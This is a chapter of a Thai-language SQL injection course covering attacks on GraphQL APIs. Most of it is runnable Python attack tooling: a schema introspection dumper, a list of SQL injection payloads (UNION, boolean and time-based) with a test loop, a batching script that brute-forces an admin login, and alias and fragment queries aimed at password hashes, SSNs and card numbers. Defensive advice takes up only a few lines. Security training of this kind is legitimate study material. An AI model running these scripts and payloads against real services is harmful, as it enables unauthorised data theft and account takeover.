# Part 088: Advanced GraphQL SQL Injection

## ภาพรวม

GraphQL ตัวเสริม: introspection, batching, fragments และระบบ federation

**ขั้นตอนที่ 1391-1405**

---

## 1391. GraphQL Introspection Attack

```python
import requests
import json

# Introspection แบบ full
def introspect(url: str, headers: dict = None):
    query = """
    query {
      __schema {
        types { name kind fields { name type { name kind ofType { name } } } }
      }
    }
    """
    r = requests.post(url, json={'query': query}, headers=headers or {}, timeout=10)
    schema = r.json()
    
    print("Types:")
    for t in schema.get('data', {}).get('__schema', {}).get('types', []):
        if t['name'].startswith('__'):
            continue
        print(f"  {t['name']} ({t['kind']})")
        if t.get('fields'):
            for f in t['fields']:
                print(f"    .{f['name']}: {f['type']['name']}")
```

---

## 1392. GraphQL และ SQL Injection

```python
import requests

# เมื่อ resolver ใช้ raw SQL แบบ concat:
# query.users = (_, {name}) => db.query(`SELECT * FROM users WHERE name = '${name}'`)

# GraphQL injection payloads:
payloads = [
    # String injection
    """query { users(name: "' OR '1'='1") { id name } }""",
    # UNION
    """query { users(name: "' UNION SELECT 1,version(),3-- -") { id name } }""",
    # Time-based
    """query { users(name: "' AND SLEEP(3)-- -") { id name } }""",
    # Integer injection
    """query { order(id: 1) { id total } }""",
    # id injection
    """query { order(id: 0) { id } }""",
]

def test_graphql_sqli(url: str):
    for payload in payloads:
        r = requests.post(
            url,
            json={'query': payload},
            headers={'Content-Type': 'application/json'},
            timeout=8
        )
        data = r.json()
        if 'error' in data and 'sql' in str(data).lower():
            print(f"[+] SQL error: {payload[:60]}")
        elif 'data' in data and data['data']:
            print(f"[+] Data returned: {str(data['data'])[:80]}")
```

---

## 1393. GraphQL Batching Attack

```python
# Batching: ส่ง multiple queries ใน array
# สามารถ brute-force ด้วยการส่ง request เดียว

import requests

def batching_brute_force(url: str, token: str, passwords: list):
    """
    บรูตเฟอร์ซ์ password ผ่าน GraphQL batching
    """
    batch = [
        {
            'query': 'mutation { login(user: "admin", pass: "' + pwd + '") { token } }'
        }
        for pwd in passwords[:20]  # 20 ครั้งใน request เดียว!
    ]
    
    r = requests.post(
        url,
        json=batch,
        headers={'Content-Type': 'application/json'},
        timeout=10
    )
    
    results = r.json()
    for i, res in enumerate(results):
        if res.get('data', {}).get('login', {}).get('token'):
            print(f"[+] Success with password: {passwords[i]}")
            return passwords[i]
    
    return None

# Defense: ปิด introspection ใน production
# ปิด batching หรือ จำกัดขนาด
# Rate limiting สำหรับ mutations
```

---

## 1394. GraphQL Fragment และ Alias Injection

```graphql
# Fragment สำหรับเปลี่ยน field ที่ดึง:
query {
  user(id: 1) {
    ...sensitiveFields
  }
}

fragment sensitiveFields on User {
  id
  password_hash  # ถ้า schema expose ไว้
  ssn
  credit_card
}

# Alias สำหรับ request ที่ซับซ้อน:
query BruteForce {
  a1: login(user: "admin", pass: "pass1") { token }
  a2: login(user: "admin", pass: "pass2") { token }
  a3: login(user: "admin", pass: "pass3") { token }
  # ...
}
# ส่งแค่ request เดียว, ได้ 100+ login attempts!
```

---

## สรุป

Advanced GraphQL SQLi:
- **Introspection** - schema discovery
- **Variable injection** - SQL via GraphQL variables
- **Batching attack** - brute-force ใน 1 request
- **Alias** - bypass rate limits
- **Defense** - disable introspection, rate limit

---

*Part 088 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
